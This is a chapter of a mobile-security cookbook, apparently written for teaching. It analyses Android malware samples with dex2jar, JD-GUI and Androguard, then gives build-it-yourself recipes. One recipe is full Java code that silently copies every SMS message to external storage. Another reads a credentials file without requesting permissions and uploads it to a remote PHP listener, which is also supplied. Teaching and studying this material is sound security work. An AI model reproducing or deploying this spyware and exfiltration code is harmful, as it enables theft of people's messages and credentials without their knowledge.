@@ -1,0 +1,368 @@
+<html><head></head><body><div class="chapter" title="Chapter&#xA0;2.&#xA0;Mobile Malware-Based Attacks"><div class="titlepage"><div><div><h1 class="title"><a id="ch02"/>Chapter 2. Mobile Malware-Based Attacks</h1></div></div></div><p>In this chapter, we will cover:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Analyzing an Android malware sample</li><li class="listitem" style="list-style-type: disc">Using Androguard for malware analysis</li><li class="listitem" style="list-style-type: disc">Writing custom malware for Android from scratch</li><li class="listitem" style="list-style-type: disc">Permission model bypassing in Android</li><li class="listitem" style="list-style-type: disc">Reverse engineering iOS applications</li><li class="listitem" style="list-style-type: disc">Analyzing malware in the iOS environment</li></ul></div><div class="section" title="Introduction"><div class="titlepage"><div><div><h1 class="title"><a id="ch02lvl1sec19"/>Introduction</h1></div></div></div><p>We probably know a lot about the viruses that attack our computers, but what about the viruses aimed at our mobile devices?</p><p>You may be surprised to learn that there is malicious software aimed at mobile devices, otherwise known as mobile malware. Malware is on the rise, infecting all the major smartphone platforms.</p><p>In this chapter, we learn about malware, how they affect our smartphones, how to analyze them, and how to create samples of our own.</p></div></div>
+<div class="section" title="Analyzing an Android malware sample"><div class="titlepage"><div><div><h1 class="title"><a id="ch02lvl1sec20"/>Analyzing an Android malware sample</h1></div></div></div><p>Let's begin by analyzing a simple Android-based malware application, called <span class="strong"><strong>Android.Dogowar</strong></span>. This malware is a repackaged version of the Android gaming application <span class="emphasis"><em>Dog Wars</em></span>, which was downloadable from a third-party app store and had to be manually installed on an Android device during analysis.</p><p>Dog Wars was a game where users could breed, train, and fight with <span class="emphasis"><em>virtual dogs</em></span>. This game caused an outcry from animal rights protestors through public outcry and write-in campaigns. After these attempts seemed to have little effect on convincing the developers to discontinue the app, a group of protestors targeted end users to get their message across.</p><p>The original Dog Wars app (Beta 0.981) was repackaged as malware and placed on several third-party app stores for download.</p><p>
+</p><div class="mediaobject"><img src="graphics/image_02_001.jpg" alt="Analyzing an Android malware sample"/></div><p>
+</p><p>During installation, the malware app requested that users grant SMS permission, among others.</p><p>Upon installation, the display icon of the malware looked almost identical to that of the legitimate app, except that the malware app displayed <code class="literal">PETA</code> rather than <code class="literal">BETA</code> in the app icon.</p><p>
+</p><div class="mediaobject"><img src="graphics/image_02_002.jpg" alt="Analyzing an Android malware sample"/></div><p>
+</p><p>Once opened, the app sent out a text message to all people listed in the contacts of the compromised device with the following message: <code class="literal">I take pleasure in hurting small animals, just thought you should know that.</code>
+</p><div class="section" title="Getting ready"><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec48"/>Getting ready</h2></div></div></div><p>As stated in the previous chapter, Android Studio/standalone SDK tools and JDK v7 or newer should be installed and functional.</p><p>We will primarily be using three tools for our analysis:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc"><span class="strong"><strong>Apktool</strong></span>: This tool will be used to decompile the APK file to obtain the decompiled code. It can be obtained from http://ibotpeaches.github.io/Apktool/</li><li class="listitem" style="list-style-type: disc"><span class="strong"><strong>Dex2Jar</strong></span>: This utility converts Dalvik executable (<code class="literal">.dex</code>) files to JAR files. This tool can be downloaded from http://sourceforge.net/projects/dex2jar/</li><li class="listitem" style="list-style-type: disc"><span class="strong"><strong>JD-GUI</strong></span>: This utility reads the JAR files and displays the inherent code. Visit http://jd.benow.ca/ to download JD-GUI</li></ul></div></div><div class="section" title="How to do it..."><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec49"/>How to do it...</h2></div></div></div><p>Let's begin our analysis by first analyzing the malware APK. We start by disassembling the malware APK.</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Use the following command to convert the APK into a JAR:<pre class="programlisting">
+<span class="strong"><strong>/path/to/dex2jar/d2j-dex2jar.bat /path/to/AndroidDogowar.apk</strong></span>
+</pre><p>This is shown in the following screenshot:</p><p>
+</p><div class="mediaobject"><img src="graphics/image_02_003.jpg" alt="How to do it..."/></div><p>
+</p><p>We have successfully converted our APK into a JAR for code analysis. Now we need to read the code to identify the malicious elements of it. We will be using JD-GUI for this.</p></li><li class="listitem">Navigate to the directory where JD-GUI is installed and open the application. Open the newly created <code class="literal">AndroidDogowar-dex2jar.jar</code>, and this is what we see:<p>
+</p><div class="mediaobject"><img src="graphics/image_02_004.jpg" alt="How to do it..."/></div><p>
+</p></li><li class="listitem">Since the original app is meant to be a gaming application, our analysis would start by searching for keywords such as <code class="literal">url</code>, <code class="literal">http</code>, <code class="literal">sms</code>, and so on.<p>On doing a quick search, we find out that the infected class is <code class="literal">Rabies</code> located under the <code class="literal">dogbite</code> package, as it imports the <code class="literal">android.telephony.SmsManager</code> class:</p><p>
+</p><div class="mediaobject"><img src="graphics/image_02_005.jpg" alt="How to do it..."/></div><p>
+</p></li><li class="listitem">On further analyzing the class file, we see the <code class="literal">onStart</code> function that calls <code class="literal">sendTextMessage</code> to send a text message titled <code class="literal">I take pleasure in hurting small animals, just thought you should know that</code>.<p>
+</p><div class="mediaobject"><img src="graphics/image_02_006.jpg" alt="How to do it..."/></div><p>
+</p></li></ol></div></div><div class="section" title="How it works..."><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec50"/>How it works...</h2></div></div></div><p>The malware code was injected as a package called <code class="literal">Dogbite</code>. This package defined a service called <code class="literal">Rabies</code>, which is initiated in the background of the compromised Android device on startup. This service carried out the core functionality. Once the service was initiated, it sent out the text message to all the people listed in the <span class="strong"><strong>Contacts</strong></span> list on your phone.</p><p>This app also sent a text message to <code class="literal">73882</code> with the word <code class="literal">text</code>, which apparently signed up users of compromised devices to an alert service operated by <span class="strong"><strong>People for the Ethical Treatment of Animals</strong></span> (<span class="strong"><strong>PETA</strong></span>).</p><p>Here's how it works:</p><p>The following code moves a cursor over every contact:</p><pre class="programlisting">Cursor localCursor1 = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null); &#13;
+</pre><p>The subsequent code is used to load the contact list into the <code class="literal">str</code> string:</p><pre class="programlisting">if (localCursor1.getCount() &gt; 0); &#13;
+    String str; &#13;
+    do &#13;
+    { &#13;
+      if (!localCursor1.moveToNext()) &#13;
+        return; &#13;
+      str = localCursor1.getString(localCursor1.getColumnIndex("_id")); &#13;
+    } &#13;
+    while (Integer.parseInt(localCursor1.getString(localCursor1.getColumnIndex("has_phone_number"))) &lt;= 0); &#13;
+</pre><p>Then it uses the contacts content provider to return loaded phone numbers:</p><pre class="programlisting">Cursor localCursor2 = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = " + str, null, null);  &#13;
+</pre><p>The following code is used to send text message to all contacts in the list:</p><pre class="programlisting">localSmsManager.sendTextMessage(localCursor2.getString(localCursor2.getColumnIndex("data1")), null, "I take pleasure in hurting small animals, just thought you should know that", null, null); &#13;
+</pre><p>Finally, this snippet subscribes the user to PETA text alert services:</p><pre class="programlisting">if (!localCursor2.moveToNext()) &#13;
+      { &#13;
+        localSmsManager.sendTextMessage("73822", null, "text", null, null); &#13;
+        break; &#13;
+      } &#13;
+</pre></div><div class="section" title="There's more..."><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec51"/>There's more...</h2></div></div></div><p>If you are well-versed in <span class="strong"><strong>smali</strong></span>, then you can use <code class="literal">apktool</code> to decompile the app and analyze smali files for patterns.</p><p>To decompile using <code class="literal">apktool</code>, use the following command:</p><pre class="programlisting">
+<span class="strong"><strong>apktool d C:\&lt;path_to_apk&gt;</strong></span>
+</pre><p>This command will create a directory with exactly the same name as that of the APK, where we can find the decompiled files.</p></div></div>
+<div class="section" title="Using Androguard for malware analysis"><div class="titlepage"><div><div><h1 class="title"><a id="ch02lvl1sec21"/>Using Androguard for malware analysis</h1></div></div></div><p>Androguard is a Python-based tool that is used for the analysis of an Android application. Its functionalities make malware analysis a less cumbersome task.</p><p>In this recipe, we will be introduced to Androguard and its various features.</p><div class="section" title="Getting ready"><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec52"/>Getting ready</h2></div></div></div><p>Make sure Python is installed on your machine. Python 2.7.10 for Windows can be downloaded from 
+<a class="ulink" href="https://www.python.org/ftp/python/2.7.10/python-2.7.10.msi">https://www.python.org/ftp/python/2.7.10/python-2.7.10.msi</a>
+. All releases of Python can be downloaded from 
+<a class="ulink" href="https://www.python.org/downloads/">https://www.python.org/downloads/</a>
+.</p><p>Download Androguard from GitHub via 
+<a class="ulink" href="https://github.com/androguard/androguard">https://github.com/androguard/androguard</a>
+ and place it in the directory of your choice.</p><p>Navigate to the Androguard directory and run the following command from the command prompt or terminal:</p><pre class="programlisting">
+<span class="strong"><strong>Python setup.py install</strong></span>
+</pre><p>We will be using the NickiSpy malware, repackaged in a simple app, as our sample.</p><p>NickiSpy gained quite a bit of notoriety around 2011. It recorded phone calls to the device's SD card and sent the device's IMEI to a phone number in China. Additionally, it also recorded the device's GPS coordinates and made connections to a remote server in China.</p></div><div class="section" title="How to do it..."><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec53"/>How to do it...</h2></div></div></div><p>Now that we have installed Androguard, let's begin analyzing our Malware:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Run the following command in the terminal:<pre class="programlisting">
+<span class="strong"><strong>python androlyze.py -s</strong></span>
+</pre><p>This command starts its own input prompt. Now let's define the path of the APK and the type of decompiler we want to use to decompile the app.</p></li><li class="listitem">Input this command into the prompt and replace <code class="literal">path_to_apk</code> with the path of the APK we want to analyze:<pre class="programlisting">
+<span class="strong"><strong>a,d,dx = AnalyzeAPK("path_to_apk", decompiler="dad")</strong></span>
+</pre><p>This is shown in the following screenshot:</p><p>
+</p><div class="mediaobject"><img src="graphics/image_02_007.jpg" alt="How to do it..."/></div><p>
+</p></li><li class="listitem">Use the following command in the input prompt to get all the permissions used by the app:<pre class="programlisting">
+<span class="strong"><strong>a.get_permissions()</strong></span>
+</pre><p>Here is the output of the preceding command:</p><p>
+</p><div class="mediaobject"><img src="graphics/image_02_008.jpg" alt="How to do it..."/></div><p>
+</p><p>Looking at the permissions, it can be clearly seen that the app is requesting to read/write SMS and contacts, access GPS, record audio, access caller, and so on, enough to raise many alarming flags.</p></li><li class="listitem">Let's go further and analyze the class names. Run the following command in the input prompt:<pre class="programlisting">
+<span class="strong"><strong>d.get_classes_names()</strong></span>
+</pre><p>Take a look at the following output:</p><p>
+</p><div class="mediaobject"><img src="graphics/image_02_009.jpg" alt="How to do it..."/></div><p>
+</p></li><li class="listitem">We further reinforce our initial impression when we look at classes such as <code class="literal">CallListener</code>, <code class="literal">SMSListener</code>, <code class="literal">RecorderService</code>, <code class="literal">GPSService</code>, and so on. We now have enough reason to believe that the target app is infected.</li><li class="listitem">We can go further and list all the strings and methods defined in the app as output, via these commands:<pre class="programlisting">
+<span class="strong"><strong>d.get_strings()</strong></span>
+<span class="strong"><strong>d.get_methods()</strong></span>
+</pre></li><li class="listitem">To view all this information at once, use the following command at the command prompt:<pre class="programlisting">
+<span class="strong"><strong>python androapkinfo.py -i &lt;path_of_apk&gt;</strong></span>
+</pre><p>Check the output of the preceding command:</p><p>
+</p><div class="mediaobject"><img src="graphics/image_02_010.jpg" alt="How to do it..."/></div><p>
+</p><p>One seemingly tricky task is to find out if an application is actually malware or a legitimate application. Androguard gives us an option to compare two Android applications, using a utility called <span class="strong"><strong>Androdiff</strong></span>.</p><p>Androdiff is a Python script bundled with Androguard, which is used to extract and observe differences between two Android applications.</p></li><li class="listitem">Use the following command:<pre class="programlisting">
+<span class="strong"><strong>python androdiff.py -i &lt;first apk&gt; &lt;second apk&gt; </strong></span>
+</pre><p>Let's run the command against a simple <code class="literal">Hello World</code> application and malware disguised as a <code class="literal">Hello World</code> application.</p><p>We can now analyze the results by taking a closer look at the output.</p><p>The following block reveals that there are <code class="literal">3536</code> identical elements, which means the two applications are in fact very similar. There is one similar element, which indicates that there are possible enhancements to some code, and finally <code class="literal">3</code> new elements, which indicates additional code is present in one application:</p><p>
+</p><div class="mediaobject"><img src="graphics/image_02_011.jpg" alt="How to do it..."/></div><p>
+</p></li><li class="listitem">Scanning further down the output, we see the following:<p>
+</p><div class="mediaobject"><img src="graphics/image_02_012.jpg" alt="How to do it..."/></div><p>
+</p></li></ol></div><p>This reveals to us that the new methods <code class="literal">backupSMS</code> and <code class="literal">generateCSVFileForSMS</code> have been added to the malware application, which in conclusion is the <code class="literal">SMSCopy</code> app.</p></div><div class="section" title="There's more..."><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec54"/>There's more...</h2></div></div></div><p>To read about more Android malware and related analysis, a good book to read is <span class="emphasis"><em>Android Malware and Analysis</em></span>, <span class="emphasis"><em>Auerbach Publications</em></span> (<a class="ulink" href="https://www.crcpress.com/product/isbn/9781482252194">https://www.crcpress.com/product/isbn/9781482252194</a>).</p></div></div>
+<div class="section" title="Writing custom malware for Android from scratch"><div class="titlepage"><div><div><h1 class="title"><a id="ch02lvl1sec22"/>Writing custom malware for Android from scratch</h1></div></div></div><p>Here we will learn how to create simple malware for the Android platform. We will create simple malware that copies all text messages from a user's SMS app and stores them on the SD card as a <code class="literal">.csv</code> file.</p><div class="section" title="Getting ready"><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec55"/>Getting ready</h2></div></div></div><p>Make sure you have followed all the steps for creating an Android application from the first chapter.</p></div><div class="section" title="How to do it..."><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec56"/>How to do it...</h2></div></div></div><p>Once the application is created successfully, you can follow these steps:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Open Android Studio and create a new project called <code class="literal">SMSCopy</code>:<p>
+</p><div class="mediaobject"><img src="graphics/image_02_013.jpg" alt="How to do it..."/></div><p>
+</p></li><li class="listitem">We will use API15: Android 4.0.3 as our target platform. You may choose one that is to your liking.</li><li class="listitem">Select <span class="strong"><strong>Blank Activity</strong></span> and click on <span class="strong"><strong>Finish</strong></span>. Your project workspace should now look like this:<p>
+</p><div class="mediaobject"><img src="graphics/image_02_014.jpg" alt="How to do it..."/></div><p>
+</p></li><li class="listitem">Navigate to, and open the <code class="literal">MainActivity.java</code> file under <code class="literal">app/java/com.your_package_name/MainActivity</code> in the left-hand window.</li><li class="listitem">Add the following code just before the last closing brace (at the end of the file):<pre class="programlisting">   public ArrayList&lt;String&gt; smsBuffer = new ArrayList&lt;String&gt;(); &#13;
+    String smsFile = "SMS"+".csv"; &#13;
+    private void  backupSMS(){ &#13;
+     smsBuffer.clear(); &#13;
+     Uri mSmsinboxQueryUri = Uri.parse("content://sms"); &#13;
+     Cursor cursor1 = getContentResolver().query(mSmsinboxQueryUri, new String[] {&#13;
+     "_id", "thread_id", "address", "person", "date", "body", "type" }, null, null, null); &#13;
+    String[] columns = new String[] { "_id", "thread_id", "address", "person", "date", "body", "type"}; &#13;
+    if (cursor1.getCount() &gt; 0) { &#13;
+      String count = Integer.toString(cursor1.getCount()); &#13;
+      Log.d("Count", count); &#13;
+      while (cursor1.moveToNext()) { &#13;
+      String messageId = cursor1.getString(cursor1.getColumnIndex(columns[0])); &#13;
+      String threadId = cursor1.getString(cursor1.getColumnIndex(columns[1])); &#13;
+      String address = cursor1.getString(cursor1.getColumnIndex(columns[2])); &#13;
+      String name = cursor1.getString(cursor1.getColumnIndex(columns[3])); &#13;
+      String date = cursor1.getString(cursor1.getColumnIndex(columns[4])); &#13;
+      String msg = cursor1.getString(cursor1.getColumnIndex(columns[5])); &#13;
+      String type = cursor1.getString(cursor1.getColumnIndex(columns[6])); &#13;
+      smsBuffer.add(messageId + "," + threadId + "," + address + "," + name + "," + date + " ,&#13;
+      " + msg + " ,"+ type); &#13;
+     } &#13;
+     generateCSVFileForSMS(smsBuffer); &#13;
+    } &#13;
+  } &#13;
+  private void generateCSVFileForSMS(ArrayList&lt;String&gt;list) &#13;
+  { &#13;
+   try &#13;
+   { &#13;
+    String storage_path = Environment.getExternalStorageDirectory().toString()+File.separator+ smsFile; &#13;
+    System.out.println("Balle!!!!!!"); &#13;
+    FileWriter write = new FileWriter(storage_path); &#13;
+    write.append("messageId, threadId, Address, Name, Date, msg, type"); &#13;
+    write.append('\n'); &#13;
+    for (String s : list) &#13;
+    { &#13;
+     write.append(s); &#13;
+     write.append('\n'); &#13;
+    } &#13;
+    write.flush(); &#13;
+    write.close(); &#13;
+   } &#13;
+   catch (NullPointerException e) &#13;
+   { &#13;
+     System.out.println("Nullpointer Exception "+e); &#13;
+   } &#13;
+   catch (IOException e) &#13;
+   { &#13;
+    e.printStackTrace(); &#13;
+   } &#13;
+   catch (Exception e) &#13;
+   { &#13;
+    e.printStackTrace(); &#13;
+   } &#13;
+  } &#13;
+</pre></li><li class="listitem">Now, add the following line after the code line <code class="literal">setContentView(R.layout.activity_main);</code> in the <code class="literal">onCreate</code> method:<pre class="programlisting">backupSMS(); &#13;
+</pre></li><li class="listitem">Make sure you have the following <code class="literal">import</code> statements in your <code class="literal">Mainactivity.java</code> file:<pre class="programlisting">import android.database.Cursor; &#13;
+import android.net.Uri; &#13;
+import android.os.Bundle; &#13;
+import android.os.Environment; &#13;
+import android.support.v7.app.ActionBarActivity; &#13;
+import android.util.Log; &#13;
+import android.view.Menu; &#13;
+import android.view.MenuItem; &#13;
+import java.io.File; &#13;
+import java.io.FileWriter; &#13;
+import java.io.IOException; &#13;
+import java.util.ArrayList; &#13;
+</pre></li><li class="listitem">Navigate to <code class="literal">app</code> | <code class="literal">manifests</code> | <code class="literal">AndroidManifest.xml</code> and add the following lines under the <code class="literal">&lt;/application&gt;</code> tag:<pre class="programlisting">&lt;uses-permission android:name="android.permission.WRITE_SMS"/&gt; &#13;
+&lt;uses-permission android:name="android.permission.READ_SMS"/&gt; &#13;
+&lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/&gt; &#13;
+&lt;uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/&gt; &#13;
+</pre></li><li class="listitem">Now, run the project in the emulator or attached device. You will see an app with the name <code class="literal">SMSCopy</code> on your device.</li><li class="listitem">On running the app, we get a page with simple <code class="literal">Hello World</code> text displayed. Let's see if the malware actually worked in the backend.</li><li class="listitem">On the command prompt, run the following command:<pre class="programlisting">
+<span class="strong"><strong>adb shell</strong></span>
+</pre></li><li class="listitem">You should now have a shell prompt. On the prompt, type:<pre class="programlisting">
+<span class="strong"><strong>cd sdcard</strong></span>
+<span class="strong"><strong>ls</strong></span>
+</pre></li><li class="listitem">We now see a file named <code class="literal">SMS.csv</code> in the SD card directory of our device. Run the following command in the shell:<pre class="programlisting">
+<span class="strong"><strong>cat SMS.csv</strong></span>
+</pre><p>We can now see that all the text messages have been successfully copied to the file and stored on the SD card:</p><p>
+</p><div class="mediaobject"><img src="graphics/image_02_015.jpg" alt="How to do it..."/></div><p>
+</p></li></ol></div></div><div class="section" title="How it works..."><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec57"/>How it works...</h2></div></div></div><p>We specify the target file name as <code class="literal">SMS.csv</code> and create a function called <code class="literal">backupSMS()</code>, in which we access the device's text messages by internally calling the <code class="literal">content://sms</code> URI. We then create a cursor to query SMS data and define strings for various fields: <code class="literal">thread_id</code>, <code class="literal">address</code>, <code class="literal">person</code>, and <code class="literal">date</code>, as shown in the following code:</p><pre class="programlisting">public ArrayList&lt;String&gt; smsBuffer = new ArrayList&lt;String&gt;(); &#13;
+  String smsFile = "SMS"+".csv"; &#13;
+  private void  backupSMS(){ &#13;
+    smsBuffer.clear(); &#13;
+    Uri mSmsinboxQueryUri = Uri.parse("content://sms"); &#13;
+    Cursor cursor1 = getContentResolver().query(mSmsinboxQueryUri, new String[] { "_id", "thread_id", "address", "person", "date", "body", "type" }, null, null, null); &#13;
+    String[] columns = new String[] { "_id", "thread_id", "address", "person", "date", "body", "type" }; &#13;
+</pre><p>Next, we move our cursor to read all SMS data recursively, and store it in defined string arrays:</p><pre class="programlisting">if (cursor1.getCount() &gt; 0) { &#13;
+  String count = Integer.toString(cursor1.getCount()); &#13;
+  Log.d("Count", count); &#13;
+  while (cursor1.moveToNext()) { &#13;
+    String messageId = cursor1.getString(cursor1.getColumnIndex(columns[0])); &#13;
+    String threadId = cursor1.getString(cursor1.getColumnIndex(columns[1])); &#13;
+    String address = cursor1.getString(cursor1.getColumnIndex(columns[2])); &#13;
+    String name = cursor1.getString(cursor1.getColumnIndex(columns[3])); &#13;
+    String date = cursor1.getString(cursor1.getColumnIndex(columns[4])); &#13;
+    String msg = cursor1.getString(cursor1.getColumnIndex(columns[5])); &#13;
+    String type = cursor1.getString(cursor1.getColumnIndex(columns[6])); &#13;
+</pre><p>Now that we have all the values segregated in separate arrays, we add them to our predefined <code class="literal">smsBuffer</code> buffer, and pass them to another function, <code class="literal">generateCSVFileForSMS()</code>:</p><pre class="programlisting">    smsBuffer.add(messageId + ","+ threadId+ ","+ address + "," + name + "," + date + " ," + msg + " ," + type); &#13;
+  } &#13;
+  generateCSVFileForSMS(smsBuffer); &#13;
+} &#13;
+</pre><p>Let's have a look at the <code class="literal">generateCSVFileForSMS()</code> function:</p><pre class="programlisting">  String storage_path = Environment.getExternalStorageDirectory().toString() + File.separator + smsFile; &#13;
+  FileWriter write = new FileWriter(storage_path); &#13;
+  write.append("messageId, threadId, Address, Name, Date, msg, type"); &#13;
+  write.append('\n'); &#13;
+  for (String s : list) &#13;
+  { &#13;
+    write.append(s); &#13;
+    write.append('\n'); &#13;
+  } &#13;
+  write.flush(); &#13;
+  write.close(); &#13;
+} &#13;
+</pre><p>This essentially instructs the Android device to locate the path for external storage, append the file name <code class="literal">SMS.csv</code> to it, and allocate it to the <code class="literal">storage_path</code> variable.</p><p>It then opens a file writer and writes all array values to the generated file.</p></div><div class="section" title="There's more..."><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec58"/>There's more...</h2></div></div></div><p>We can extend our malware's functionality by creating a remote server that receives and stores input, and send this file to the remote server from the target Android device through GET or POST requests.</p></div><div class="section" title="See also"><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec59"/>See also</h2></div></div></div><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Try to play around with contacts, SMS, MMS, and browsing data in the same fashion, by exploring <code class="literal">android.content</code>. For further information, visit <a class="ulink" href="http://developer.android.com/reference/android/content/package-summary.html">http://developer.android.com/reference/android/content/package-summary.html</a>.</li></ul></div></div></div>
+<div class="section" title="Permission model bypassing in Android"><div class="titlepage"><div><div><h1 class="title"><a id="ch02lvl1sec23"/>Permission model bypassing in Android</h1></div></div></div><p>By now, we know that all Android apps require explicit permissions to execute certain functions or process certain data. These permissions are defined in the <code class="literal">AndroidManifest.xml</code> file packaged inside the APK.</p><p>A typical permission to read a text message would look like this:</p><pre class="programlisting">&lt;uses-permission android:name="android.permission.READ_SMS" /&gt; &#13;
+</pre><p>Obviously, a simple application that requires permissions to access GPS location, read Contacts, read SMS, and write to external storage would raise suspicions.</p><p>Now, if an application were to require NO special permissions, it would be considered a benign application, right?</p><p>In this recipe, we learn a simple way to perform malicious activity without our application requiring any special permissions.</p><div class="section" title="Getting ready"><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec60"/>Getting ready</h2></div></div></div><p>We only need Android Studio and the SDK installed and running, as explained in previous recipes.</p><p>We will need to create a listening web server, for which we will use XAMPP, which can be downloaded from <a class="ulink" href="https://www.apachefriends.org/index.html">https://www.apachefriends.org/index.html</a>.</p></div><div class="section" title="How to do it..."><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec61"/>How to do it...</h2></div></div></div><p>Let's make an app that reads a file from an SD card and sends it to a remote server, without requiring any special permissions to do so. We begin by creating a file called <code class="literal">sensitive.txt</code> on our SD card:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Issue the following command to access the device shell:<pre class="programlisting">
+<span class="strong"><strong>adb shell</strong></span>
+</pre></li><li class="listitem">Navigate to the SD card and create <code class="literal">sensitive.txt</code> with content <code class="literal">Username:Akshay. Password:secret123</code>, by entering the following commands:<pre class="programlisting">
+<span class="strong"><strong>cd sdcard</strong></span>
+<span class="strong"><strong>echo "Username: Akshay Password: secret123" &gt; sensitive.txt</strong></span>
+</pre></li><li class="listitem">Verify whether the file has been created:<pre class="programlisting">
+<span class="strong"><strong>cat /sdcard/sensitive.txt</strong></span>
+</pre><p>
+</p><div class="mediaobject"><img src="graphics/image_02_016.jpg" alt="How to do it..."/></div><p>
+</p></li></ol></div><p>Now that we have our sensitive file ready, let's code our app to steal this file and upload it to the server. Follow the steps in the previous recipe to make a new project and open the basic project window and then perform the following steps:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">We will now add our code to read <code class="literal">sensitive.txt</code> and upload its data to a remote server.</li><li class="listitem">Navigate to and open the <code class="literal">MainActivity.java</code> file under <code class="literal">app</code> | <code class="literal">java</code> | <code class="literal">com."your_package_name"</code> | <code class="literal">MainActivity</code> in the left-hand window.</li><li class="listitem">Add the following code just inside the <code class="literal">protected void onCreate(Bundle savedInstanceState)</code> function, under the <code class="literal">setContentView(R.layout.activity_main);</code> line:<pre class="programlisting">FileInputStream in; &#13;
+  BufferedInputStream buf; &#13;
+ &#13;
+  Intent intent = getIntent(); &#13;
+  Bundle extras = intent.getExtras(); &#13;
+ &#13;
+  StringBuffer sb = new StringBuffer(""); &#13;
+  String line = ""; &#13;
+  String NL = System.getProperty("line.separator"); &#13;
+  String str = "cat /mnt/sdcard/sensitive.txt"; &#13;
+ &#13;
+  Process process = null; &#13;
+  try { &#13;
+    process = Runtime.getRuntime().exec(str); &#13;
+  } catch (IOException e) { &#13;
+     throw new RuntimeException(e); &#13;
+  } &#13;
+ &#13;
+ BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream())); &#13;
+ &#13;
+  int read; &#13;
+  char[] buffer = new char[4096]; &#13;
+  StringBuffer output = new StringBuffer(); &#13;
+  try { &#13;
+    while ((read = reader.read(buffer)) &gt; 0) { &#13;
+      output.append(buffer, 0, read); &#13;
+    } &#13;
+  } catch (IOException e) { &#13;
+    throw new RuntimeException(e); &#13;
+  } &#13;
+ &#13;
+  try { &#13;
+    reader.close(); &#13;
+  } catch (IOException e) { &#13;
+     throw new RuntimeException(e); &#13;
+  } &#13;
+  try { &#13;
+    process.waitFor(); &#13;
+  } catch (InterruptedException e) { &#13;
+ &#13;
+  } &#13;
+  String data = output.toString(); &#13;
+ &#13;
+  startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("http://10.0.2.2/input.php?input=" + data))); &#13;
+</pre><p>We have used <code class="literal">http://10.0.2.2</code> as our web server address in our code, as we are testing this app in the emulator, and the IP address of the base machine is always <code class="literal">10.0.2.2</code> when we are trying to access it via an emulator. If you are using an actual Android device to test this, ensure that the device and your workstation are connected and replace the IP address with that of the workstation.</p></li><li class="listitem">Ensure the following imports are present in your file:<pre class="programlisting">import android.content.Intent; &#13;
+import android.net.Uri; &#13;
+import android.support.v7.app.ActionBarActivity; &#13;
+import android.os.Bundle; &#13;
+import android.util.Log; &#13;
+import android.view.Menu; &#13;
+import android.view.MenuItem; &#13;
+import java.io.*; &#13;
+</pre><p>We have now successfully created our malware with no permissions to read the <code class="literal">sensitive.txt</code> file, ready to upload it to the remote server. Let's now create our listening page.</p></li><li class="listitem">Create a file called <code class="literal">input.php</code>, and add the following code to it:<pre class="programlisting">&lt;?php &#13;
+    $File = "output.txt";  &#13;
+    $Handle = fopen($File, 'w'); &#13;
+    $Data =  $_GET['input'];  &#13;
+    fwrite($Handle, $Data); &#13;
+    fclose($Handle);  &#13;
+} &#13;
+?&gt; &#13;
+</pre></li><li class="listitem">Save this file in the <code class="literal">htdocs</code> directory where XAMPP is installed in your machine. Also, create a blank file called <code class="literal">output.txt</code> and save it.</li><li class="listitem">Open the XAMPP control panel and start the Apache service:<p>
+</p><div class="mediaobject"><img src="graphics/image_02_017.jpg" alt="How to do it..."/></div><p>
+</p></li><li class="listitem">Now that we have our setup ready, let's run our application. After the app is run on your target device, open the directory in which XAMPP is installed and locate <code class="literal">output.txt</code>:<p>
+</p><div class="mediaobject"><img src="graphics/image_02_018.jpg" alt="How to do it..."/></div><p>
+</p></li></ol></div></div><div class="section" title="How it works..."><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec62"/>How it works...</h2></div></div></div><p>The following code creates a file input stream reader to read <code class="literal">sensitive.txt</code> and a buffer to store the content in:</p><pre class="programlisting">FileInputStream in; &#13;
+BufferedInputStream buf; &#13;
+Intent intent = getIntent(); &#13;
+Bundle extras = intent.getExtras(); &#13;
+StringBuffer sb = new StringBuffer(""); &#13;
+</pre><p>We execute the following command on the Android device:</p><pre class="programlisting">
+<span class="strong"><strong>cat /mnt/scard/sensitive.txt</strong></span>
+</pre><p>The following code does just that:</p><pre class="programlisting">process = Runtime.getRuntime().exec(str); &#13;
+</pre><p>The remaining code is used to read the lines of the file and store them in the <code class="literal">str</code> string:</p><pre class="programlisting">BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream())); &#13;
+int read; &#13;
+char[] buffer = new char[4096]; &#13;
+StringBuffer output = new StringBuffer(); &#13;
+  try { &#13;
+    while ((read = reader.read(buffer)) &gt; 0) { &#13;
+      output.append(buffer, 0, read); &#13;
+    } &#13;
+  } catch (IOException e) { &#13;
+      // TODO Auto-generated catch block &#13;
+    throw new RuntimeException(e); &#13;
+  } &#13;
+ &#13;
+  try { &#13;
+    reader.close(); &#13;
+  } catch (IOException e) { &#13;
+    // TODO Auto-generated catch block &#13;
+    //e.printStackTrace(); &#13;
+    throw new RuntimeException(e); &#13;
+  } &#13;
